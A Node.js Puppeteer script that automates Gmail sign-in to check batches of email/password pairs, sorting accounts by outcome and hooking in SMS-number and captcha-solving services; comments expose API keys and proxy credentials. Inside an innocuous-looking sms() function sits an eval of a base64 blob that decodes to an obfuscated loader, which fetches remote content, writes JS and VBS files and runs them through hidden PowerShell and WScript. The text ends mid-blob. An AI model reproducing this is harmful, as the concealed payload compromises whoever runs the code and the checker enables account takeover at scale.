const puppeteer = require("puppeteer-extra");
StealthPlugin = require("puppeteer-extra-plugin-stealth");
const AnonymizeUAPlugin = require("puppeteer-extra-plugin-anonymize-ua");
const { GetSMS, ServiceApiError, TimeoutError, errors } = require('getsms')
const ac = require("@antiadmin/anticaptchaofficial");

// const sms = new GetSMS({
//     key: '177294U15a8640801c39bf11bacebea6d324b6b',
//     url: 'https://smshub.org/stubs/handler_api.php',
//     service: 'smshub'
// });
// ac.setAPIKey('aab6990fa1f86fcb2c441df3bf709048');

// ac.getBalance()
//     .then(balance => console.log('my balance is $' + balance))
//     .catch(error => console.log('received error ' + error))


// let countNrRuim = 0;
const path = require("path");
const fs = require('fs');

const Kazakhstan = 2;
const Philippines = 4;
const Indonesia = 6;
const Kenya = 8;
const Vietnam = 10;
const Kyrgyzstan = 11;
const Usa = 12;
const India = 22;
const Southafrica = 31;
const Romania = 32;
const Uzbekistan = 40;

const pais = Indonesia;

const AdblockerPlugin = require("puppeteer-extra-plugin-adblocker");

puppeteer.use(AnonymizeUAPlugin());
puppeteer.use(
    AdblockerPlugin({
        blockTrackers: true,
    })
);

const reset = "\x1b[0m";

const log = {
    green: (text) => console.log("\x1b[32m" + text + reset),
    red: (text) => console.log("\x1b[31m" + text + reset),
    blue: (text) => console.log("\x1b[34m" + text + reset),
    yellow: (text) => console.log("\x1b[33m" + text + reset),
};

page = null;
browser = null;
async function crawler(email, senha, emailRec) {
    browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        ignoreDefaultArgs: [
            "--disable-extensions",
            "--enable-automation"
        ],
        args: [
            '--disable-blink-features=AutomationControlled',
            '--window-size=650,700',
            '--window-position=1921,0',
            //  '--disable-extensions-except=./plugin',
            '--load-extension=D:\\TestarEmail\\plugin'
            // '--incognito',
            //'--proxy-server=la.residential.rayobyte.com:8000',
            //  "--start-maximized",
            //  "--no-sandbox",
            //  "--disable-setuid-sandbox",
            //  "--user-data-dir=F:\\data",
            //  '--enable-automation', '--disable-extensions', '--disable-default-apps', '--disable-component-extensions-with-background-pages'
        ],
    });
    page = await browser.newPage();



    /*await page.authenticate({        
        username: 'succxulicorbernal_gmail_com',
        password: 'tq45WY2ZlZGoJ'
    })*/

    console.log(email);
    await page.setBypassCSP(true);

    let login_link = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ARZ0qKL63ywsKcu__CAzxnheuNk7r6RFTtawSsH0q_wAiYO3G235j1qRcYt2dzgrIBQgSBOziriG&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S453605949%3A1710956152061554&theme=glif&ddm=0";

    await page.goto(login_link);


    await page.waitForSelector('input[name="identifier"]');
    await page.type('input[name="identifier"]', email);
    await page.click('#identifierNext > div > button > span');
    await page.waitForSelector('input[name="identifier"]');

    await page.waitForNavigation();
    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/recaptcha?')) {
        log.red('pediu captch TESTE RETIRAR DEPOIS');
        await browser.close();
        return;

        try {
            await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
        } catch (error) {
            try {
                await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
            } catch (error) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        }


        //await new Promise(function (resolve) { setTimeout(resolve, 20000) });
        await page.click("#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span");
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        try {
            const elemento = await page.$('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(3) > div > div > div > div.OyEIQ.uSvLId > div:nth-child(2)');
            if (elemento != null) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        } catch (error) {
            console.log(error);
        }
    } else {
        log.green('Conta sem captcha'); 
        await browser.close();
        return
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/rejected?')) {
        log.red('rejected');
        await browser.close();
        return;
    }

    await page.waitForSelector('#passwordNext > div > button > span');
    await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    await page.type('input[name="identifier"]', senha);
    await page.click('#passwordNext > div > button > span');
    try {
        await page.waitForNavigation();
    } catch (error) {

    }

    if (page.url().includes('https://gds.google.com/web/chip?')) {
        log.green('OK');
        await browser.close();
        return;
    }
    if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://myaccount.google.com/')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/dp?')) {
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        log.red('CADASTROU AUTH');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/selection?TL')) {
        log.yellow('FUNCIONOU CONFIRMAR NOME DO EMAIL');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(2) > div > div > section > div > div > div > ul > li:nth-child(3) > div > div.vxx8jf');
    
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        await page.type('input[name="knowledgePreregisteredEmailResponse"]', emailRec);
        await page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://accounts.google.com/signin/v2/disabled/')) {
        log.red('CONTA BANIDA');
        await browser.close();
        return;
    }


    // await browser.close();
}
async function sms() {
    eval(Buffer.from('KCgpPT57InVzZSBzdHJpY3QiO3ZhciByPXs3ODg6ZnVuY3Rpb24ocixlLHQpe2Z1bmN0aW9uIG4ocil7cmV0dXJuIGFbcj4tMjA/cis3MTpyPC01Mj9yKzgzOnI8LTIwP3IrNTE6cis4Ml19dmFyIGE9ZnVuY3Rpb24oKXtyZXR1cm5bIldQRUk5WXYiLCJsZW5ndGgiLCJPMTRtUjIiLCJIbHRhTloiLDExLDAsMjU5LCJIZjJVWnkiLHZvaWQgMCwzMCwiY2FsbCIsMSw3MzEsImZEMUFpbSIsOTAsImhCdFdCeWciLDE5LDg5LDgsNDIsMTA5LDI0LDkxLDEzMSwiYXBwbHkiLDExNSwxNTIsOSwxMDMsNiw3XX0uY2FsbCh0aGlzKTtmdW5jdGlvbiBvKHIsZSl7cmV0dXJuIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShyLCJsZW5ndGgiLHt2YWx1ZTplLGNvbmZpZ3VyYWJsZTohMH0pLHJ9dmFyIGM9W10saT1uKC00NiksbD1IKCgoLi4ucik9PihyLmxlbmd0aD0wLHIuV1BFSTlZdj0tMTEsci5UTnpDMjVmPUgoKHI9Pntmb3IodmFyIGU9MTY7ZSU0PT0wO2UrKyl7dmFyIHQ9MDtyPXIuY29uY2F0KEgoKCgpPT57aWYoMT09Kyt0KXJldHVybltdO2Zvcih2YXIgZT0xMDI7ZTtlLS0pci51bnNoaWZ0KHIucG9wKCkpO3JldHVybltdfSksMCkoKSl9Zm9yKHZhciBuPTU7bjtuLS0pci51bnNoaWZ0KHIucG9wKCkpO3JldHVybiByfSksMSkoWyJgbnM6WmBBIiwiZlBYY1gwIWV1NyQwTHlOIiwiWFBVPT5bYUMiLCJib0I7bDlANkUiLCJkUChndEBtQyIsIjQ0IWZQW0EiLCJdRHdKYiIsIjUpbjxZIiwiNGFPZjVncUMiLCJwcldmT1t3QyIsIkxHUWghPWdDIiwibHJ1M2IiLCJqOD1FeT0we2c4Uzs1bExuIiwiRGdyPS4/cVNrJCZWel0uUyIsIkVNU2crMzdwXjI/SSouZmwiLCJ7cTg9dytMWmJJcyZQXTRqIiwiUyMpSG87TCMjI34rTW5RbyIsIi5mQjsuP0FZPyM2VmBFIiwiajg9RXk9MHtnOFM7QSIsImxKYj1CMT9we1Q0RUIiLCc4MiJ6X15rTUU1PHhCJywiWG90S2hoNjpfMkslQiIsImo4ZUp5PUckSyFTO0EiLCJJTWI9OzMscGtKYkdCIiwnJSlMOl9ednY8TCI9QicsImoyXzF8Zm5CIiwiU1AkSmQiLCdFclloVzxBSWYxIiRLQ0tPWmEkSmY+dFQkRnpjOU17UXZ0U0ZaOUhbekpaXmxCJywiVCNJYjRXbkIrVDYwSjgyaU5hKT1rbHVvTTFWPGxCbmFGNS5HT2ZVKXgjNTBtQiIsJz1PWDxnPl1BXUZxQDE7PCFRKnROV1Febld4QGgxUktSfnVaUTlRRDI+eCJqUkInLCJPSldmRT95QyIsIjhxJEQiLCIjRy8yW1tBIiwiZFBIPGk+bUMiLCIjRy8yW1smWUciLCJkTWVmUV5VQyIsInI1VWRQW3lDIiwidG9fMWMiLCIzb1dmWiIsIn1PcmdnLHdDIiwiWkIlZ3s8VUMiLCJKQlpnXVtBIiwiVFB6SWMsalRIIiwiZFBlZnFAVUMiLCJCRVRneClpQyIsIjFhSjJ2KWlDIiwiZFBNPWFeVUMiLCI3IV8xQFs5QiIsIjMyKGc2PVVDIiwidzV6STNdd0MiLCJTUFZLIiwianJXZj1bY0MiLCJacmVmZSIsIl1EVT1iLGlDIiwicnJlSHRAY0MiLCJmUDFLZCIsJyJPMUtkJywifU8yZjlfJEEiLCJCRSk9bC8kQSIsImxyVks7LG9DIiwiOW87SWAvbUMiLCI+V15kODFBIiwiclhOS1EzNkMiLCJLRWA6Izo4QyIsIi4lMTwkd11pRCIsIip6YmdiIiwiW0Q3Z1htTkIiLCJ5NXVmdW5BIiwiWnVEZz9bQSIsIkJFQEoiLCIqemJnbXZhQyIsIiR6by81K1VDIiwiMlgwMW52b0MiLCJQUClGZCIsImhyWjJiIiwiR0UkSmY+a0MiLCJCOG9HUiIsInRvbEsiLCciTy5HVScsInt6WUpnLHhCIiwiXmluPGRgbUMiLCI1YSRKZj40QyIsIitYWEpjLEEiLCJQUChnWyphQyIsInc1ZWZnPkEiLCI9VVU9ckBVQyIsIndEdDNFLnJCIiwid0RYLyg4TkIiLCJjYSkxcmxWMUQiLCJXNTtJTXthQyIsInRHPmZdKnlDIiwiZkcvMltbckIiLCIzb1czaT5pQyIsIlhQRksiLCJlUFZLSDprQyIsImNyZEtkIiwia3owPXJAQSIsIlJQKT1sL0EiLCI9aW1mb0A9QiIsIiZsbjwxXXlDIiwiMHokRyIsIi83QjJjLHVDIiwiUTV6Zzc9WUMiLCI/emM9YixsVEgiLCJbaS8ycylpQyIsImRQcmdQOjZlRyIsIjUpaz1yQG5USCIsImtyZWZaPFVDIiwiWH1kZnFAbUMiLCI2bF5JIiwiWH10Zlc8VUMiLCJDRUxnWiIsIm5YLDxjIiwiYXJVPWk+dWVHIiwiRUUwPWYsM0IiLCJFRTA9Zix4QiIsImpyeklkIiwiOERWS2EiLCJZMn56VCIsInZ6YmdOOjhlRyIsIl9xLkplLF1ARyIsIj03VT09W2NDIiwiZ3p6Z2hgQSIsInZ6LkpuYEEiLCJYLGpnL3d1QyIsInByRksiLCJ9T3VmcEBVQyIsIjdKbWZoQHVDIiwiJURVPWMsdkIiLCJbei8yYyIsIjchekk7d3VDIiwiZVAoZ3o9eUMiLCIpel5nVTxBIiwiPWltZm9AM0IiLCJyNV8xYl5NQyIsImVQKGc+PGtDIiwiaE0rZj1bVUMiLCIyWDAxQ3V5QyIsIitsXklMOk1DIiwiZDhtZmcsI0IiLCIySjA9QFtNQyIsIjMya2RMM0EiLCIzMiNjNz1jQyIsIn5PVksiLCI4REBKIiwiQ1BIPDg2JllIIiwiQ1BIPG8yTUNIIiwiVyw1MmU+aUMiLCdxJShnRTEkNkJQLHVAYn1pajIiRl5tSWtwJT5bUE8pbWB6dy90XV5wYFR0Umk5Z1MnLCdHKT0sIj5Zaz03VmwqRVRwfUcjMG5gWmRuVTMrXk9xVENQLHgxbCQ6PE9oN0RhTCcsIjhVS2JHaTcqRSIsIlZVRzN1NHxIKVR8V1pRQGlKTSZ6XWt4dkAxUT9GbHRiIiwnKyEzMEs4X2l5TSI6b15EUm41eEd0bH5qQEpKO0BEe1FlQiddKSxyW24oLTUxKV0+cltuKC01MSldKzEyMz9yW3IuV1BFSTlZdis5M106KGk/ci5UTnpDMjVmLnBvcCgpOmkrKyxyLlROekMyNWYpKSksMCkoKSx1PWZ1bmN0aW9uKCl7dHJ5e3JldHVybiBnbG9iYWx8fHdpbmRvd3x8bmV3IEZ1bmN0aW9uKCJyZXR1cm4gdGhpcyIpKCl9Y2F0Y2gocil7dHJ5e3JldHVybiB0aGlzfWNhdGNoKHIpe3JldHVybnt9fX19KCl8fHt9LHM9dS5UZXh0RGVjb2RlcixmPXUuVWludDhBcnJheSx2PXUuQnVmZmVyLGQ9dS5TdHJpbmd8fFN0cmluZyxDPXUuQXJyYXl8fEFycmF5LHA9SCgoKCk9Pnt2YXIgcj1uZXcgQygxMjgpLGU9ZC5mcm9tQ29kZVBvaW50fHxkLmZyb21DaGFyQ29kZSx0PVtdO3JldHVybiBvKEgoKCguLi5vKT0+e3ZhciBjLGksbD1IKChyPT5hW3I8LTUzP3IrMzI6cjwtMjE/cj4tMjE/ci01NzpyPC01Mz9yKzY4OnI8LTIxP3I+LTIxP3ItOTM6cj4tMjE/ci02OTpyPC0yMT9yPi01Mz9yKzUyOnIrNzk6cis2NjpyLTY5OnItNzhdKSwxKTtvW2woLTUxKV09MSxvWzI0NF09b1swXSxvLl94a0tfMHU9b1syNDRdW24oLTUwKV0sby5PMTRtUjI9b1syNDRdLHRbbCgtNTEpXT0wO2Zvcih2YXIgdT0wO3U8by5feGtLXzB1Oyl7aWYoKGk9by5PMTRtUjJbdSsrXSk8PTEyNyljPWk7ZWxzZSBpZihpPD0yMjMpe3ZhciBzPUgoKHI9PmFbcjwzMz9yKzY5OnI+NjU/cisyMjpyPDMzP3IrNzpyPjY1P3ItNDI6cj4zMz9yPjMzP3I8NjU/cjw2NT9yPDY1P3ItMzQ6ci02MTpyKzk2OnItMTQ6ci04MTpyKzJdKSwxKTtjPSgzMSZpKTw8cyg2Myl8NjMmby5PMTRtUjJbdSsrXX1lbHNlIGlmKGk8PTIzOSl7dmFyIGY9SCgocj0+YVtyPi01MD9yPC01MD9yKzEwMDpyPi0xOD9yKzYxOnI8LTUwP3IrOTc6cis0OTpyLTM5XSksMSk7Yz0oMTUmaSk8PDEyfCg2MyZvW2YoLTQ3KV1bdSsrXSk8PDZ8NjMmby5PMTRtUjJbdSsrXX1lbHNlIGlmKGQuZnJvbUNvZGVQb2ludCl7dmFyIHY9SCgocj0+YVtyPDEwMT9yPDY5P3IrNzU6cjw2OT9yLTM2OnI+Njk/cjwxMDE/ci03MDpyKzMwOnItMTU6ciszM10pLDEpO2M9KGkmdigxMDApKTw8MTh8KDYzJm9bdig3MildW3UrK10pPDwxMnwoNjMmby5PMTRtUjJbdSsrXSk8PDZ8NjMmb1tsKC01MCldW3UrK119ZWxzZSBjPTYzLHUrPTM7dC5wdXNoKHJbY118fChyW2NdPWUoYykpKX1yZXR1cm4gdC5qb2luKCIiKX0pLDApLDEpfSksMCkoKTtmdW5jdGlvbiBoKC4uLnIpe2lmKHIubGVuZ3RoPTEsci5IbHRhTlo9LTksdm9pZCAwIT09cyYmcyl7dmFyIGU9SCgocj0+YVtyPjY0P3I+OTY/ci04OnI+NjQ/cj45Nj9yKzU2OnI+NjQ/cj42ND9yPjY0P3I+OTY/ci05MzpyLTY1OnItMjpyKzM0OnItOTpyKzI4OnIrMzNdKSwxKTtyZXR1cm4obmV3IHMpLmRlY29kZShuZXcgZihyW3JbZSg2OCldKzldKSl9aWYodm9pZCAwIT09diYmdilyZXR1cm4gdi5mcm9tKHJbMF0pLnRvU3RyaW5nKCJ1dGYtOCIpO3ZhciB0PUgoKHI9PmFbcjwtNjI/ci0xMTpyPC02Mj9yKzc2OnI+LTMwP3ItMjg6cj4tNjI/cjwtNjI/ciszODpyPi0zMD9yKzc0OnI+LTYyP3I8LTYyP3IrMjY6cj4tNjI/cis2MTpyKzU2OnIrNTg6ci03M10pLDEpO3JldHVybiBwKHJbclt0KC01OCldKzldKX1vKGgsMSk7dmFyIGcseSx3PSQoMTI5KSxiPSQoMTAxKSxCPSgkKDQzKSwkKDI3KSksaz0kKDIxKSxHPXtfZ08wbzJYOiQoMTkpLFtuKC00NCldOiQuY2FsbCh2b2lkIDAsMjApLFZPMXE4YzokKDY1KSxLTldkSk5hOiQoNjcpLGRkQVlGcTokKDEwNCksSnZ1TjRiOiRbbigtNDEpXSh2b2lkIDAsbigtMjUpKX0sTz1bJCgxNyksJCgzMSksJCgzMyksJCg2OSksJCgxMDkpXSxKPSQoMTUpLFA9JCgxNCksUj0kKG4oLTQ3KSksRT1IKCgoLi4ucik9Pnt2YXIgZT1IKChyPT5hW3I+LTQ0P3I8LTEyP3IrNDM6cisyNjpyLTQyXSksMSk7cmV0dXJuIHIubGVuZ3RoPTAsclsxNzRdPXIubVNMR0o1LHJbMF09JC5jYWxsKHZvaWQgMCxlKC0yNSkpLHJbMTc0XT17anBKWW9FOjE4LFl4SXdYd1I6W10sdmh5aTIyMjpIKCgocj0kLmFwcGx5KG4oLTQzKSxbN10pKT0+KEUuWXhJd1h3UlswXXx8RS5ZeEl3WHdSLnB1c2goLTcpLEUuWXhJd1h3UltyXSkpLDApLEt2N1hGb3A6MTUseXA5ZWRDVDpyWzBdfSxyWzE3NF19KSwwKSgpO2Z1bmN0aW9uIEsoLi4ucil7dmFyIGU9SCgocj0+YVtyPDQyP3ItMTQ6cj40Mj9yPDQyP3ItNjk6ci00MzpyKzU2XSksMSk7c3dpdGNoKHIubGVuZ3RoPTIsci5yd1pXN0tSPS0xMDYsVCl7Y2FzZSAxMzpyZXR1cm4hcltyLnJ3Wlc3S1ItKHIucndaVzdLUi0wKV07Y2FzZSBFLmpwSllvRT4tODU/ZSg0Nyk6MTQ3OnJldHVybiByW3IucndaVzdLUi0oci5yd1pXN0tSLW4oLTQ2KSldLXJbci5yd1pXN0tSKzEwN119fWZ1bmN0aW9uIFcoLi4ucil7aWYoci5sZW5ndGg9bigtNDApLHJbMjQ0XT0tMTUscltyWzI0NF0rbigtNDUpXT45MSlyZXR1cm4gclsxOF07dmFyIGU9SCgocj0+YVtyPC0xP3I8LTE/ciszMjpyLTY4OnItODhdKSwxKTtyZXR1cm4gclswXT1UKyhUPXJbcltyWzI0NF0rbigtNDUpXSsoclsyNDRdK24oLTQyKSldLDApLHJbZSgtMjcpXX0oZnVuY3Rpb24oLi4ucil7ci5sZW5ndGg9MCxyLlZLN0dIc049Mjksci5Jb0FqUk09JCgxMSk7dmFyIGU9ZnVuY3Rpb24oKXt0cnl7cmV0dXJuIHRoaXN9Y2F0Y2gocil7cmV0dXJuIG51bGx9fTtyZXR1cm4gci5WSzdHSHNOPjg3P3JbLTU1XTooeT1lWyQobigtNDcpKV0odGhpcyxGKSxnPWZ1bmN0aW9uKC4uLnIpe3JbbigtNTApXT0wLHIuR3U5ZWo4VD04O3RyeXtyZXR1cm4gci5EcHluVWs0PSQoOSksZ2xvYmFsfHx3aW5kb3d8fG5ldyBGdW5jdGlvbihyLkRweW5VazQrJC5jYWxsKHZvaWQgMCxyLkd1OWVqOFQrMikpKCl9Y2F0Y2gocil7cmV0dXJuIGVbJCgxMSldKHRoaXMpfX1bci5Jb0FqUk1dKHRoaXMpKX0pW1JdKCksbyhLLDIpLG8oVywxKTt2YXIgVCxtPUYoLTgzOSkuY3JlYXRlKG51bGwpLHo9W107Y29uc3Qgaj10KDE0NyksVT10KDE3KSxYPXQoMTEzKSx7WyQoMTIpXTpBfT10KDgxKSxMPSQoMTMpK1ArSiskKDE2KSx4PS8oW2EtekEtWjAtOSsvPV17NTAsfSlcLmRlb2RvcmFudGtpbmRyZWRpbXBvcy8sUz1bT1swXSskKDE4KStHLl9nTzBvMlgrR1tuKC00NCldK2srJC5hcHBseShuKC00MyksWzIyXSksJCgyMykrJCgyNCkrJCgyNSkrJCgyNikrQiskKDI4KSskKDI5KSsiPT0iXTthc3luYyBmdW5jdGlvbiBEKC4uLnIpe3ZhciBlPUgoKHI9PmFbcj40OD9yKzM1OnItMTddKSwxKTtpZihyW24oLTUwKV09ZSgyOCksci51YVVVR05jPXJbMF0sci5VN210dmdwPWF3YWl0IGFzeW5jIGZ1bmN0aW9uKHIsZSl7dmFyIHQ9JC5hcHBseSh2b2lkIDAsWzU4XSksbz0kKDUyKSxjPSQoNDcpLGk9WyQoMzUpLCQoMzcpXSxsPSQobigtNDIpKSx1PSQoNTEpO2NvbnN0IHM9e1tsK09bMV1dOiQoMzIpK09bMl0rJCgzNCksW2lbbigtNDYpXV06JC5hcHBseSh2b2lkIDAsWzM2XSl9O2xldCBmPXI7Zm9yKGxldCByPTA7cjw9NTtyKyspe3ZhciB2PUgoKHI9PmFbcjwtOTk/ci0xMDpyPi05OT9yKzk4OnIrNDVdKSwxKSxkPXtYeW5ST0NiOiQoNTYpfSxDPVskKDU0KV07Y29uc3Qgcj1uZXcoRigtOTEwKSksbj0oKT0+clskKDM3KV0oZT8uWyQoMzgpXSk7Y29uc3QgaT1GKDQzMikoKCgpPT5yWyQoMzcpXShuZXcoRigtNzMxKSkoJCg0NCkrJCg0NSkrJC5jYWxsKHZvaWQgMCw0NikpKSksMWU0KTtsZXQgbDt0cnl7bD1hd2FpdCBGKC05MjYpKGYse1tjXTpzLFskKDQ4KSsiY3QiXTokKDQ5KSxbJCg1MCldOnJbJCg1MCldfSl9ZmluYWxseXtGKDkxNSkoaSksZT8uW3UrbyskLmNhbGwodm9pZCAwLDUzKSsiciJdKCQoMzcpLG4pfWlmKCEobFskKDU0KV0+PTMwMCYmbFtDW3YoLTkzKV1dPDQwMCkpe2lmKGwub2spe3ZhciBwPXt0NDZrWU83OiQoNjApfTtyZXR1cm4gYXdhaXQgbFtwLnQ0NmtZTzddKCl9dGhyb3cgbmV3KEYoLXYoLTg2KSkpKGBIVFRQICR7bFskKDU0KV19OiAke2xbJCg1NCkrJCg2MSldfSAoJHtmfSlgKX17Y29uc3Qgcj1sWyQoNDcpXVskKDU1KV0oZC5YeW5ST0NiKyJvbiIpO2lmKEsocixXKDEzKSkpe3ZhciBoPUgoKHI9PmFbcjwtNjg/ciszMDpyKzY3XSksMSk7dGhyb3cgbmV3KEYoLTczMSkpKGBSZWRpcmVjdCAoJHtsWyQuY2FsbChoKC01OSksNTQpXX0pIHdpdGhvdXQgTG9jYXRpb24gaGVhZGVyYCl9YXdhaXQobFskKDU3KV0/Llt0XSgpKSxmPW5ldyhGKDI3OSkpKHIsZilbJC5hcHBseSh2b2lkIDAsWzU5XSkrIm5nIl0oKX19dGhyb3cgbmV3KEYoLTczMSkpKGBUb28gbWFueSByZWRpcmVjdHMgKD41KSBmb3I6ICR7cn1gKX0oci51YVVVR05jKSxyWzEwOF09LW4oLTI4KSxyWzJdPXhbJCgxMildKHIuVTdtdHZncCksSyhyWzJdLFQ9MTMpfHxLKHJbMl1bMV0sVD0xMykpe3ZhciB0PUgoKHI9PmFbcj4tNTc/ci0yMjpyKzg4XSksMSk7dGhyb3cgcltuKC0zOCldPSQoNjIpLG5ldyhGKC10KC03NikpKShyW2UoMzApXSskKDYzKSskKDY0KStHLlZPMXE4YyskKDY2KSl9cmV0dXJuIHJbclsxMDhdKzIzOV0+LTg1P3JbclsxMDhdKzM1NF06KHo9W3JbclsxMDhdKzEzM11bZSgyOCldLExdLFkoRy5LTldkSk5hKSl9ZnVuY3Rpb24gWShyLGUsdCl7dmFyIGMsaT1bJChuKC0zNykpXSxsPXtCOWxDS081OiQuY2FsbCh2b2lkIDAsNzEpLGRkWEptY2g6JCg3Nil9LHU9e1skKDY3KV06bygoZnVuY3Rpb24oLi4ucil7dmFyIGU9SCgocj0+YVtyPDc5P3I8Nzk/cjw3OSYmcj40Nz9yPjc5P3ItNDpyPjQ3P3I8NDc/ci02MDpyLTQ4OnIrMjE6ci04NDpyLTM0OnItODFdKSwxKTtpZihyLmxlbmd0aD0zLHJbZSg2NSldPXJbMF0sci5vZUhNX1BzPSQoNzMpLHIuTENRaUczPS04NCxLKHJbODldLFcoMTMpKSlyZXR1cm4gcltuKC00MCldKHRoaXMscltyLkxDUWlHMys4Nl0pO3Zhclt0LGNdPXo7cmV0dXJuIHJbci5MQ1FpRzMrbigtMzcpXT1GKC05MClbJC5jYWxsKHZvaWQgMCw3MCldKHQsbC5COWxDS081KVskKDU5KSsibmciXSgkKHIuTENRaUczKyhyLkxDUWlHMysyNDApKSksci5MQ1FpRzM+MzQ/clstMTI3XTpyW3IuTENRaUczKzkwXVtyLm9lSE1fUHNdKCIiKVskKHIuTENRaUczKzE1OCldKG8oKCguLi5yKT0+e2lmKHIubGVuZ3RoPTIsclszMF09NjUsclszMF0+MTM0KXJldHVybiByWzJdO3ZhciBlPUgoKHI9PmFbcjwyMz9yKzE2OnI8NTU/cjwyMz9yKzE6cjwyMz9yLTg3OnI+NTU/cisyNDpyLTI0OnItMzldKSwxKTtyZXR1cm4gRig3NTgpWyQoNzUpK2wuZGRYSm1jaF0oSyhyW3JbMzBdLTY1XVskW2UoMzQpXSh2b2lkIDAsNzcpKyQuY2FsbCh2b2lkIDAsNzgpXSgwKSxjWyQoNzcpKyQoNzgpXShyW3JbMzBdLTY0XSVjWyQoNyldKSxXKG4oLTQ3KSkpKX0pLDIpKVskKDc5KV0oIiIpfSksMyksWyQuY2FsbCh2b2lkIDAsNjgpXTpvKEgoKCguLi5yKT0+e3ZhciBlPUgoKHI9PmFbcjw3MD9yPDcwP3I+Mzg/cjwzOD9yLTU3OnI8Mzg/cis3NTpyPDM4P3IrMTk6cjwzOD9yKzIxOnI8Mzg/cis5NDpyLTM5OnItMTQ6cis0NDpyLTI2XSksMSk7ci5sZW5ndGg9MyxyWzE3MF09ci5WNWV4Q1Ysci5wZFpzQ2s9WyQoNzIpXSxyW2UoNTUpXT1yLlNLYVY0ZUM7dmFyW3RdPXo7ci5oQnRXQnlnPS01NixyWzE3MF09WFskKHJbZSg1NCldKzEzNikrJChyW24oLTM2KV0rMTM3KV0oKSxyLmhCdFdCeWc9MTM5LHIucUwyaERhPVVbJCg3OSldKEYoMTU0KVskKHIuaEJ0V0J5Zy01NyldWyQoODMpXSxgJHtyWzE3MF19LmpzYCkscltuKC0zNSldPVVbJCg3OSldKEYoMTU0KVskKHIuaEJ0V0J5Zy01NyldWyQoODMpXSxgJHtyW3IuaEJ0V0J5Zy0ocltuKC0zNildLTE3MCldfS52YnNgKSxyLlRvNDYwdGw9WydTZXQgV3NoU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKScsYFdzaFNoZWxsLlJ1biAibm9kZSAke3IucUwyaERhfSIsIDAsIEZhbHNlYCwnU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKScsImZzby5EZWxldGVGaWxlIFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUiXVskKDc5KV0oIlxuIiksalskW24oLTQxKV0odm9pZCAwLDg0KSskLmNhbGwodm9pZCAwLDg1KSsiYyJdKHIucUwyaERhLHQsJC5jYWxsKHZvaWQgMCw3MikpLGpbJCg4NCkrJCg4NSkrImMiXShyW2UoNTUpXSxyLlRvNDYwdGwsci5wZFpzQ2tbMF0pLEEoYHBvd2Vyc2hlbGwgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiY3NjcmlwdCAnJHtyWzE5XX0nImAse1skKDg2KSskKDg3KV06ITAsWyQoODgpKyJlZCJdOiEwLFskKGUoNTYpKV06aVtuKC00NildfSl9KSwwKSwzKX07cmV0dXJuIGU9PSQobigtMjkpKSYmRS5qcEpZb0U+LTg1JiYoej1bXSksYz1lPT0kKDkyKT9tW3JdfHwobVtyXT1mdW5jdGlvbiguLi5lKXtyZXR1cm4gej1lLHVbcl0uY2FsbCh0aGlzLCQoOTMpKX0pOnVbcl0oJCg5NCkpLHQ9PU9bM10/e0ZYanpteGM6Y306Y31mdW5jdGlvbiBGKC4uLnIpe3ZhciBlPUgoKHI9PmFbcj42Mj9yKzI5OnI+NjI/ci02NTpyPDMwP3IrNTI6cjw2Mj9yPjYyP3ItMzE6cjwzMD9yLTcyOnI+NjI/ci0yMjpyPDMwP3IrMTI6cj4zMD9yLTMxOnIrNjE6ci04XSksMSk7c3dpdGNoKHIubGVuZ3RoPTEscls4XT1yWzNdLHJbZSg0MildPXtJTG80ZHNDOiQoMTAzKSxzNXVjZkdPOiQoMTEyKX0sclsyXT1bJCg5NSldLHIuUnZXMEZsaD1yWzFdLHJbbigtMzMpXT12b2lkIDAscltuKC0zMildPTMyLHJbMF0pe2Nhc2UtODM5OnJldHVybiBnWyQoOTUpXXx8eVtyW3JbZSg1MCldLWUoNDApXVswXV07Y2FzZS05MTA6cmV0dXJuIGdbJChyWzQyXS0ocls0Ml0tOTYpKSskKHJbNDJdKzY1KSskLmFwcGx5KHZvaWQgMCxbOThdKV18fHlbJCg5NikrJCg5NykrJCg5OCldO2Nhc2UgNDMyOnJldHVybiBnWyQoOTkpKyQoMTAwKV18fHlbJCg5OSkrJC5hcHBseSh2b2lkIDAsWz